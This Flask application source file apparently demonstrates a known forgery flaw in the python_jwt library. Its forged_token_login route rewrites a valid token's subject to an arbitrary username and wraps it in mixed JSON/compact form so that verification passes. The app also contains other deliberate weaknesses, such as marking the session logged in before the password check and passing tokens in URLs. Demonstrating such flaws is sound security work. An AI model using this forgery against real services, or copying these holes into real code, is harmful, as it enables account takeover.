from flask import Flask, render_template, request, jsonify, redirect, url_for, session
from flask_session import Session 
from flask_sqlalchemy import SQLAlchemy
from werkzeug.security import generate_password_hash, check_password_hash
import python_jwt
import jwcrypto.jwk as jwk, datetime
import json
import os
from jwcrypto.common import base64url_decode, base64url_encode
from common import generated_keys
from datetime import timedelta

app = Flask(__name__)
app.config['SESSION_TYPE'] = 'filesystem'
app.secret_key = os.urandom(24)
app.config['SQLALCHEMY_DATABASE_URI'] = 'sqlite:///users.db'
Session(app)
db = SQLAlchemy(app)
key = jwk.JWK.generate(kty='RSA', size=2048)
token = None

class User(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    username = db.Column(db.String(50), unique=True, nullable=False)
    password = db.Column(db.String(100), nullable=False)

@app.route('/')
def home():
    if not session['logged_in']:
        return redirect(url_for('login'))
    token = request.args.get('token')
    username = request.args.get('username')
    if not token or  not username:
        session['logged_in'] = False
        return redirect(url_for('login'))
    
    return render_template('home.html', token=token, username=username)


@app.route('/register', methods=['GET', 'POST'])
def register():
    if request.method == 'POST':
        username = request.form['username']
        password = request.form['password']

        if not username or not password:
            return jsonify({'message': 'Please provide username and password'}), 400

        user = User.query.filter_by(username=username).first()

        if user:
            return jsonify({'message': 'Username already taken'}), 400

        hashed_password = generate_password_hash(password, method='sha256')

        new_user = User(username=username, password=hashed_password)
        db.session.add(new_user)
        db.session.commit()

        return redirect(url_for('login'))

    return render_template('register.html')


@app.route('/login', methods=['GET', 'POST'])
def login():
    if request.method == 'POST':
        username = request.form['username']
        password = request.form['password']

        session['logged_in'] = True
        session['username'] = username


        user = User.query.filter_by(username=username).first()

        if not user:
            return render_template('login.html', error='Invalid username or password')

        if not check_password_hash(user.password, password):
            return render_template('login.html', error='Invalid username or password')
        
        payload = {'sub': username}
        
        global token
        token = python_jwt.generate_jwt(payload, generated_keys['PS256'], 'PS256', timedelta(minutes=60))

        return redirect(url_for('home', token=token, username=username)) # Pass token as URL parameter

    return render_template('login.html')


@app.route('/token_login', methods=['GET','POST'])
def token_login():
    # Get the token from request data
    global token
    print(token)
    if not token:
        return jsonify({"msg": "Missing token parameter"}), 400

    # Try to verify the token using python_jwt.verify_jwt()
    try:
        header, claims = python_jwt.verify_jwt(token, generated_keys['PS256'], ['PS256'])
    except Exception as e:
        return jsonify({'error': str(e)}), 400

    # Get username from the token's claims
    username = claims.get('sub', None)

    print(username)

    # Check if user exists in the database
    user = User.query.filter_by(username=username).first()
    if not user:
        session['logged_in'] = False
        return redirect(url_for('login'))
    
    session['logged_in'] = True
    session['username'] = username

    return redirect(url_for('home', token=token, username=username)) # Pass token as URL parameter


@app.route('/forged_token_login', methods=['GET', 'POST'])
def forged_token_login():
    if request.method == 'POST':
        username = request.form['username']

        global token
        print(f"TOKEN: {token}")
        # Split the generated JWT into three components: header, payload, and signature
        [header, payload, signature] = token.split('.')
        
        # Decode the payload and parse the JSON to get a Python dictionary
        parsed_payload = json.loads(base64url_decode(payload))
        
        # Change the 'sub' claim in the parsed payload to 'root'
        parsed_payload['sub'] = username
        
        # Set an expiry time to a future value
        parsed_payload['exp'] = 2000000000
        
        # Encode the modified payload back to a JSON string and then base64url-encode it
        fake_payload = base64url_encode(json.dumps(parsed_payload, separators=(',', ':')))
        
        # Forge a token using a mix of JSON and compact serialization format to test the library's resilience
        forged_token = '{"  ' + header + '.' + fake_payload + '.":"","protected":"' + header + '", "payload":"' + payload + '","signature":"' + signature + '"}'
        try:
            header, claims = python_jwt.verify_jwt(forged_token, generated_keys['PS256'], ['PS256'])
        except Exception as e:
            return jsonify({'error': str(e)}), 400

        # Get username from the token's claims
        username = claims.get('sub', None)

        # Check if user exists in the database
        user = User.query.filter_by(username=username).first()
        if not user:
            session['logged_in'] = False
            return redirect(url_for('login'))

        return redirect(url_for('home', token=forged_token, username=username)) # Pass token as URL parameter

if __name__ == '__main__':
    db.create_all()
    app.run(debug=True)
